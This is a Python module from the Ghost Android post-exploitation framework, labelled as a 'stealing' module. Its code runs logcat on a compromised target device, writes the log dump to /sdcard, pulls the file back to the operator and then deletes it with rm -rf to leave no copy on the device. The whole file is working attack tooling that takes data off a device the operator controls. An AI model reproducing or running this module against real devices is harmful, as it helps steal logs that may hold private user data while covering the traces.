#!/usr/bin/env python3

# Valentin Lobstein 2022
# Default Project : https://github.com/EntySec/Ghost

from beautifultable import BeautifulTable
from termcolor import colored
from core.badges import badges
from core.ghost import ghost

class GhostModule:
    def __init__(self):
        self.badges = badges()
        self.ghost = ghost()

        self.name = "log"
        self.description = "Show logs from target system."
        self.usage = "Usage: log <output_name>"
        self.type = "stealing"
        self.args = 2

    def run(self, cmd_data): 
        output = self.ghost.send_command("shell","logcat -d > /sdcard/logcat.txt")
        if "logcat read failure" in output:
            print(self.badges.E + f"Cannot Dump Logs...")
        else:
            output = self.ghost.send_command("pull", f"/sdcard/logcat.txt {cmd_data.split(' ')[0]}")
            output = self.ghost.send_command("shell", f"rm -rf /sdcard/logcat.txt")
            print(self.badges.G + f"Logs ready at {cmd_data.split(' ')[0]}")
            